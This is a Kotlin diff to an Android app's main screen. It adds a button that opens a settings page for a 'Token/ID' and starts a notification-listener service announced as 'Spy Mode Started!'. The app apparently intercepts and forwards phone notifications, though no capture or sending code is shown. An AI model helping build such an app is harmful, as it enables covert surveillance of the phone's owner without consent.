@@ -7,12 +7,12 @@ import android.provider.Settings
 import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
-import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var btnStart: Button
+    private lateinit var btnSettings: Button
     private lateinit var tvStatus: TextView
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -20,6 +20,7 @@ class MainActivity : AppCompatActivity() {
         setContentView(R.layout.activity_main)
 
         btnStart = findViewById(R.id.btn_start)
+        btnSettings = findViewById(R.id.btn_settings) // New Button
         tvStatus = findViewById(R.id.tv_status)
 
         checkPermission()
@@ -28,24 +29,27 @@ class MainActivity : AppCompatActivity() {
             startService(Intent(this, NotificationListener::class.java))
             Toast.makeText(this, "Spy Mode Started!", Toast.LENGTH_SHORT).show()
         }
+
+        // ✅ Open Settings to enter Token/ID
+        btnSettings.setOnClickListener {
+            startActivity(Intent(this, SettingsActivity::class.java))
+        }
     }
 
     private fun checkPermission() {
-        // Check if we have permission to post notifications (Android 13+)
         val hasNotificationPermission = checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == android.content.pm.PackageManager.PERMISSION_GRANTED
         
         if (!hasNotificationPermission) {
             requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 101)
         }
 
-        // Check Notification Listener Setting
         val listenerEnabled = Settings.Secure.getString(contentResolver, "enabled_notification_listeners").contains(packageName)
         
         if (!listenerEnabled) {
             tvStatus.text = "Please enable Notification Access in Settings."
             btnStart.isEnabled = false
             
-            // Open Settings directly
+            // Direct link to Notification Access Settings
             startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
         } else {
             tvStatus.text = "System Ready. Press Start."
